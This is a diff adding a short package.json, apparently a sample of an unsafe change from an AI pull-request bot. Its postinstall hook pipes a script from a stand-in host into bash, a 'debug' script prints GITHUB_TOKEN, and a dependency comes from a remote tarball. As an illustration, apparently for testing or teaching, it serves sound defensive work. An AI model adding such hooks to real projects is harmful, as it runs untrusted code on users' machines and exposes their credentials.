@@ -1,0 +1,12 @@
+{
+  "name": "unsafe-ai-pr-bot-example",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | bash",
+    "debug": "printenv GITHUB_TOKEN"
+  },
+  "dependencies": {
+    "demo": "https://example.invalid/demo.tgz"
+  }
+}
+
